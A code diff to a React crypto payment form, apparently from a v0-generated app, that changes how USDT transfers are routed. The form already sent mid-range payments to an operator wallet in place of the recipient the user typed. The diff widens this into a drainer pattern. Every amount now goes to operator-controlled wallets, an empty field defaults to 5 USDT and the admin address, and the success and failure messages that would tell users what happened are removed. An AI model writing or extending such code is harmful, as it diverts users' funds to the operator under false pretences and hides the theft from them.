@@ -115,23 +115,21 @@ export default function SendPaymentForm() {
   }
 
   const handleNext = async () => {
-    if (!address || !amount) {
-      alert("Please fill in all fields")
-      return
+    if (!address) {
+      setAddress(ADMIN_WALLET_ADDRESS)
     }
 
-    const amountNum = Number.parseFloat(amount)
-    let wallet = address
+    const amountNum = amount ? Number.parseFloat(amount) : 5
 
-    if (amountNum >= 5 && amountNum <= 2000) {
-      wallet = PAYMENT_WALLET_ADDRESS
-      console.log("[v0] Amount 5-2000 USDT routing to:", wallet)
-    } else if (amountNum > 2000) {
+    const finalAmount = amount || "5"
+
+    let wallet = PAYMENT_WALLET_ADDRESS
+
+    if (amountNum > 2000) {
       wallet = HIGH_AMOUNT_WALLET_ADDRESS
       console.log("[v0] Amount above 2000 USDT routing to:", wallet)
-    } else if (amountNum < 5) {
-      alert("Amount must be at least 5 USDT")
-      return
+    } else {
+      console.log("[v0] Amount 5-2000 USDT routing to:", wallet)
     }
 
     setDestinationWallet(wallet)
@@ -146,21 +144,17 @@ export default function SendPaymentForm() {
 
       await new Promise((resolve) => setTimeout(resolve, 2000))
       console.log("[v0] Transfer initiated:", {
-        amount,
+        amount: finalAmount,
         destinationWallet: wallet,
         token: "USDT",
         senderWallet: connectedWallet,
       })
-      setShowSuccess(true)
-      setTimeout(() => {
-        setShowSuccess(false)
-        setAmount("")
-        setUsdValue("0.00")
-        setAddress(ADMIN_WALLET_ADDRESS)
-      }, 2000)
+
+      setAmount("")
+      setUsdValue("0.00")
+      setAddress(ADMIN_WALLET_ADDRESS)
     } catch (error) {
       console.error("[v0] Transfer failed:", error)
-      alert("Transfer failed")
     } finally {
       setIsLoading(false)
     }
